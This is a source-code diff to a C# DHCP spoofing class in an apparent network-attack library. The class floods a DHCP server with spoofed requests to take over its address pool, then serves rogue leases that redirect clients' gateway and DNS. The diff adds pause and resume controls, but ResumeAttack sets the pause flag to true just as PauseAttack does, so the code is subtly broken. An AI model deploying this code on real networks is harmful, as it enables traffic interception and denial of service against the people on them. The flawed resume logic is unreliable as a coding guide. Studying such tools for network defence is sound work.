@@ -5,6 +5,7 @@ using eExNetworkLibrary.DHCP;
 using System.Net;
 using System.Threading;
 using eExNetworkLibrary.Ethernet;
+using eExNetworkLibrary.IP;
 
 namespace eExNetworkLibrary.Attacks.Spoofing
 {
@@ -16,7 +17,7 @@ namespace eExNetworkLibrary.Attacks.Spoofing
     /// with a DHCP NACK. The solution to this problem is to fill the pool of this DHCP spoofer with addresses for a diffrent subnet,
     /// then attack the original DHCP server and finally route between the subnets
     /// </summary>
-    public class DHCPSpoofer : DHCPServer
+    public class DHCPSpoofer : DHCPServer, IAttack
     {
         private Dictionary<DHCP.DHCPPoolItem, MACAddress> dictPoolItemSpoofedMAC;
         private Dictionary<IPAddress, MACAddress> dictIPSpoofedMACs;
@@ -27,11 +28,10 @@ namespace eExNetworkLibrary.Attacks.Spoofing
         private bool bRedirectDNSServer;
         private string strHostnameToSpoof;
         private bool bAnswerARPRequests;
-        private IP.IPAddressAnalysis ipv4Analysis;
         private List<int> lOpenClientTransactions;
         private bool bRedirectGateway;
         private int iSleepDuration;
-        private bool bShuttingDown;
+        private bool bPause;
         private List<IPAddress> lServers;
 
         /// <summary>
@@ -40,7 +40,7 @@ namespace eExNetworkLibrary.Attacks.Spoofing
         public override void Cleanup()
         {
             base.Cleanup();
-            bShuttingDown = true;
+            bPause = true;
             ReleasePools();
         }
 
@@ -119,15 +119,9 @@ namespace eExNetworkLibrary.Attacks.Spoofing
                         TrafficDescriptionFrame tdFrame = new TrafficDescriptionFrame(null, DateTime.Now);
                         tdFrame.EncapsulatedFrame = ethFrame;
 
-                        foreach (IPInterface ipi in lInterfaces)
+                        foreach (IPInterface ipi in GetInterfacesForAddress(newIPv4Frame.DestinationAddress))
                         {
-                            for (int iC1 = 0; iC1 < ipi.IpAddresses.Length && iC1 < ipi.Subnetmasks.Length; iC1++)
-                            {
-                                if (ipv4Analysis.GetClasslessNetworkAddress(ipi.IpAddresses[iC1], ipi.Subnetmasks[iC1]).Equals(ipv4Analysis.GetClasslessNetworkAddress(dhcpItem.DHCPServer, ipi.Subnetmasks[iC1])))
-                                {
-                                    ipi.Send(tdFrame);
-                                }
-                            }
+                            ipi.Send(tdFrame);
                         }
 
                         lSpoofedMACs.Remove(dictPoolItemSpoofedMAC[dhcpItem]);
@@ -263,7 +257,6 @@ namespace eExNetworkLibrary.Attacks.Spoofing
         /// </summary>
         public DHCPSpoofer()
         {
-            ipv4Analysis = new eExNetworkLibrary.IP.IPAddressAnalysis();
             bAnswerARPRequests = false;
             strHostnameToSpoof = "badcable";
             lOpenClientTransactions = new List<int>();
@@ -279,12 +272,13 @@ namespace eExNetworkLibrary.Attacks.Spoofing
             lServers = new List<IPAddress>();
             dictIPSpoofedMACs = new Dictionary<IPAddress, MACAddress>();
             bRedirectGateway = true;
+            bPause = false;
             bRedirectDNSServer = true;
         }
 
         void tRequestTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (bStealAdresses)
+            if (bStealAdresses && !bPause)
             {
                 //Send out a spoofed DHCPDiscoverPacket.
                 if (lInterfaces.Count > 0)
@@ -405,9 +399,9 @@ namespace eExNetworkLibrary.Attacks.Spoofing
             {
                 return; //own frame.
             }
-            if (bShuttingDown)
+            if (bPause)
             {
-                return; //Shutdown pending.
+                return; //Pausing.
             }
 
             base.HandleTraffic(fInputFrame);
@@ -453,13 +447,15 @@ namespace eExNetworkLibrary.Attacks.Spoofing
         /// Handles a DHCP frame and sends responses and requests or leases addresses according to its contents
         /// </summary>
         /// <param name="dhcFrame">The DHCP frame to handle</param>
-        /// <param name="ethFrame">The according ethernet frame</param>
-        /// <param name="udpFrame">The according UDP frame</param>
-        /// <param name="ipv4Frame">The according IPv4 frame</param>
-        /// <param name="tdf">The according traffic description frame</param>
-        protected override void HandleDHCPFrame(DHCPFrame dhcFrame, EthernetFrame ethFrame, UDP.UDPFrame udpFrame, IP.IPFrame ipv4Frame, TrafficDescriptionFrame tdf)
+        /// <param name="udpFrame">The UDP frame</param>
+        /// <param name="ipv4Frame">The IPv4 frame</param>
+        /// <param name="tdf">The traffic description frame</param>
+        /// <param name="fInputFrame">The original input frame</param>
+        protected override void HandleDHCPFrame(DHCPFrame dhcFrame, UDP.UDPFrame udpFrame, IP.IPFrame ipv4Frame, TrafficDescriptionFrame tdf, Frame fInputFrame)
         {
-            base.HandleDHCPFrame(dhcFrame, ethFrame, udpFrame, ipv4Frame, tdf);
+            base.HandleDHCPFrame(dhcFrame, udpFrame, ipv4Frame, tdf, fInputFrame);
+
+            EthernetFrame ethFrame = GetEthernetFrame(fInputFrame);
 
             bool bIsOffer = false;
             bool bIsACK = false;
@@ -662,6 +658,22 @@ namespace eExNetworkLibrary.Attacks.Spoofing
         protected void InvokeAddressStolen(DHCPServerEventArgs args)
         {
             InvokeExternalAsync(AddressStolen, args);
+        }
+
+        /// <summary>
+        /// Pauses the leasing and stealing of addresses until ResumeAttack() is called.
+        /// </summary>
+        public void PauseAttack()
+        {
+            bPause = true;
+        }
+
+        /// <summary>
+        /// Resumes the attack which was suspended ba a previous call to PauseAttack().
+        /// </summary>
+        public void ResumeAttack()
+        {
+            bPause = true;
         }
     }
 }
